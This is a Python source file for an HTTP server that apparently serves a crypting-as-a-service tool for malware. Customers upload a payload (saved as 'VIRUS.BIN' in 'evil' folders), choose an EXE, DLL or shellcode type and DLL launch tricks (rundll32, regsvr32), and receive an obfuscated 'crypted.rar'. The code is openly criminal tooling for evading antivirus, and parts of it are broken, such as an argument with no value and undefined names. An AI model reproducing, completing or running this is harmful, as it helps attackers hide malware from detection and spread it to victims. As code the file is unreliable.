# todo: remove print()s
import os, io, cgi, urllib, pprint, time, errno, random, re
import http.server, socketserver
import win32file, win32con, win32api
import mergedeep

from c2.backend import BackendFactory

from ..sprayer.fgconfgen import *
from ..scenario_builder import *
from ..crp_params import *
from ..config import *
from ..web_config import * #ADDED
from ..common.dictapply import dictapply
from ..common.get_next_filename_seqnum import get_next_filename_seqnum
from ..common.rar_cmdline import rar_cmdline
from ..sprayer.common.merge_dicts import *

sys.path.append(WEB_CONF_DIR)
from customers import *


_sd = os.path.dirname(__file__)
_j = os.path.join

PORT = 44444
MAX_FILE_SIZE = 1024 * 1024

def combine_profiles(default_profile, ovr_profile):
  mergedeep.merge(default_profile, ovr_profile, strategy=mergedeep.Strategy.TYPESAFE_REPLACE)
  pass

class CustomHTTPRequestHandler(http.server.SimpleHTTPRequestHandler):
  def do_GET(self):
    try:
      self._output_index()
    except Exception as e:
      #print('Exception in GET', e)
      self._return_error(f'Exception in GET - {e}')
      return
    pass

  def do_POST(self):
    LOCK = None
    try:
      self._handle_post()
    except Exception as e:
      if LOCK != None:
        self._unlock(LOCK)
      self._return_error(f'Exception in POST - {e}')
      raise

  def _handle_post(self):
    parsed_path = urllib.parse.urlparse(self.path)
    cn = self._customer_from_path(parsed_path)
    cc = customer_configs
    form = cgi.FieldStorage(fp=self.rfile, headers=self.headers,
                            environ={'REQUEST_METHOD': 'POST',
                                     'CONTENT_TYPE': self.headers['Content-Type'], })
    if isinstance(form["file"], list):
      # for record in form["file"]:  #open("./%s"%record.filename, "wb").write(record.file.read())
      raise RuntimeError('upload file list not implemented')
    # print('original filename is', form["file"].filename)

    crp_in_params = {
      'bin_arch': None,
      'bin_type': None,
      'dll_opts': None,
    }

    def apply_form_to_dict(d, f):
      dictapply(d, f, lambda k: str(f.getvalue(k)))

    apply_form_to_dict(crp_in_params, form)

    validate_crp_in_params(crp_in_params)

    custdir = _j(WEB_CUSTOMERS_DIR, cn)
    lockfile = f'{custdir}/LOCK'

    LOCK = self._lock(lockfile)

    evil_num = get_next_filename_seqnum(f'{custdir}/evil')

    evil_name = f'evil{evil_num:05d}'
    evil_dir = _j(custdir, evil_name)
    os.makedirs(evil_dir, exist_ok=True)
    evil_file = _j(evil_dir, 'VIRUS.BIN')
    f = form["file"].dbname
    f.seek(0, 2)
    file_size = f.tell()
    f.seek(0)
    if file_size > MAX_FILE_SIZE:
      raise RuntimeError(f'File size exceeds {MAX_FILE_SIZE} bytes limit')
    file_data = form["file"].dbname.read()

    open(evil_file, "wb").write(file_data)

    # Overwrite default profile
    ovr_profile = cc[cn]['profile']
    profile = json.load(open(f'{_sd}/../default_profile.json', 'r'))
    combine_profiles(profile, ovr_profile)

    backend_fac = BackendFactory('class://normal', loccrypts_dir=)
    backend = backend_fac.create_backend(
      BackendArgs(evil_file,############################NOT BACKEND!!!!!!!!!!!!!!!!!!!!!!!!!!!! CRYPTORR!!!!!!!!!!!!!!!!
                  {**def_pay_info, 'bin_type': 'win_shellcode', 'cpu': 'intel64'},
                  crp_opts,
                  rnd_opts,
                  bld_opts,
                  f))
    backend.do_init()
    backend.do_crypt(f'{evil_dir}/cryptor.log')
    bin_paths = backend.get_out_bin_paths()
    obpaths = [bin_paths['ReleaseSprayed']['virprog'], bin_paths['ReleaseSprayed']['virlib']]
    obpaths.append(evil_dir + '/_OUTDATA_.json')
    rarpath = f'{custdir}/{evil_name}.rar'
    cl = rar_cmdline(obpaths, rarpath)
    print(f'Packing files - cmdline: {cl}')

    os.system(cl)

    print('Packing done')

    self._unlock(LOCK)

    rardata = open(rarpath, 'rb').read()
    self.send_response(200)
    self._zip_headers(len(rardata), 'crypted.rar')
    self.end_headers()
    self.wfile.write(rardata)

  def _lock(self, lockfile):
    ### TODO: class to use
    hFile = win32file.CreateFile(lockfile, win32file.GENERIC_WRITE, 0, None, win32con.CREATE_ALWAYS, 0, None)
    print(f'CreateFile: ')
    if hFile == -1:
      raise RuntimeError()
    LOCK = hFile
    return LOCK

  def _unlock(self, LOCK):
    hLockFile = LOCK
    print(f'Closing handle ')
    win32api.CloseHandle(hLockFile)

  def _zip_headers(self, content_length, filename):
    self.send_header('Cache-Control', 'public') # needed for internet explorer
    self.send_header('Content-Type', ' application/zip')
    self.send_header('Content-Transfer-Encoding', 'Binary')
    self.send_header('Content-Length', f'{content_length}')
    self.send_header('Content-Disposition', f'attachment; filename={filename}')

  def _redirect(self):
    self.send_response(301)
    #self.send_header("Content-type", "text/plain")
    self.send_header("Location", '/')
    self.end_headers()

  def _customer_from_path(self, path):
    pdir = path.path[1:-1] # trim '/' left and right
    if not pdir in customers_mapping:
      raise RuntimeError()
    return customers_mapping[pdir]

  def _return_error(self, msg):
    self.send_response(200)
    self.end_headers()
    entire_message = 'ERROR\n'+msg
    self.wfile.write(entire_message.encode('ascii'))

  def _output_index(self):
    parsed_path = urllib.parse.urlparse(self.path)
    custname = self._customer_from_path(parsed_path)
    cc = customer_configs

    at_least_one_type_enabled = cc[custname]['enable_exe_type'] >= 0 or cc[custname]['enable_dll_type'] >= 0 or\
                                cc[custname]['enable_shellcode_type'] >= 0
    at_least_one_platform_enabled = cc[custname]['enable_x86_platform'] >= 0 or cc[custname]['enable_x64_platform'] >= 0

    custdir = _j(WEB_CUSTOMERS_DIR, custname)

    self.send_response(200)
    self.end_headers()

    b = \
    f'''<html>
    <head><title></title></head>
    <body>
      <p>Welcome, dear friend. Fill the form bellow and good luck.</p>
    '''

    print_customer_config = False
    if print_customer_config:
      s = io.StringIO()
      pprint.pprint(cc[custname], stream=s)
      b += s.getvalue()
      b += '<hr />'

    b += '''
      <form action="?" method="post" enctype="multipart/form-data" >
        <input type="file" name="file" />
    '''
    b += '<p></p>'

    if at_least_one_platform_enabled:
      b += '<p>Input file platform</p>'
      if cc[custname]['enable_x86_platform'] >= 0:
        _dis = ' disabled ' if cc[custname]['enable_x86_platform'] == 0 else ''
        b += f'<input type="radio" name="bin_arch" value="x86"{_dis}><label for="child">x86</label><br>'
      if cc[custname]['enable_x64_platform'] >= 0:
        _dis = ' disabled ' if cc[custname]['enable_x64_platform'] == 0 else ''
        b += f'<input type="radio" name="bin_arch" value="x64"{_dis}><label for="adult">x64</label><br>'

    if at_least_one_type_enabled:
      b += '''<p>Input file type</p>'''
      if cc[custname]['enable_exe_type'] >= 0:
        _dis = ' disabled ' if cc[custname]['enable_exe_type'] == 0 else ''
        b += f'''<input type="radio" name="bin_type" value="exe"{_dis}><label for="adult">EXE</label><br>'''
      if cc[custname]['enable_dll_type'] >= 0:
        _dis = ' disabled ' if cc[custname]['enable_dll_type'] == 0 else ''
        b += f'''<input type="radio" name="bin_type" value="dll"{_dis}><label for="child">DLL</label><br>'''
      if cc[custname]['enable_shellcode_type'] >= 0:
        _dis = ' disabled ' if cc[custname]['enable_shellcode_type'] == 0 else ''
        b += f'''<input type="radio" name="bin_type" value="shellcode"{_dis}><label for="senior">Shellcode</label>'''
      if cc[custname]['enable_dll_opts'] >= 0:
        _dis = ' disabled ' if cc[custname]['enable_dll_opts'] == 0 else ''
        b += \
        f'''
        <p>
         &nbsp;&nbsp;&nbsp;<input type="radio" name="dll_opts" /{_dis}> From DllMain<br />
         &nbsp;&nbsp;&nbsp;<input type="radio" name="dll_opts" /{_dis}> Use export (rundll32 1.dll ExportFunc)<br />
         &nbsp;&nbsp;&nbsp;<input type="radio" name="dll_opts" /{_dis}> Use export DllInstall (regsvr32 -e -n -i:SomeString 1.dll)<br />
         &nbsp;&nbsp;&nbsp;<input type="radio" name="dll_opts" /{_dis}> Proxy export func: <input type="text" name="proxy_export" <br />
        </p>
        '''
        pass
    b += '''
    <p></p>
    <input type="submit" value="Do the thing" />
    </form>
    '''

    file_links = []
    for file in os.listdir(custdir):
      m = re.match('^evil([0-9]{5})\.rar$', file)
      if m:
        file_links += [f'<a href="?get={m[1]}">crypted_{m[1]}.rar</a>']
    b += f'''      
      <hr />
      {', '.join(file_links)}
      '''

    b += ''' 
    </body>
    </html>
    '''
    _b = b.encode('ascii')
    self.wfile.write(_b)

class ThreadedHTTPServer(socketserver.ThreadingMixIn, http.server.HTTPServer):
  """Handle requests in a separate thread."""

server = ThreadedHTTPServer(('localhost', 44444), CustomHTTPRequestHandler)
server.serve_forever()

#Handler = CustomHTTPRequestHandler
#with socketserver.TCPServer(("", PORT), Handler) as httpd:
#  print("serving at port", PORT)
#  httpd.serve_forever()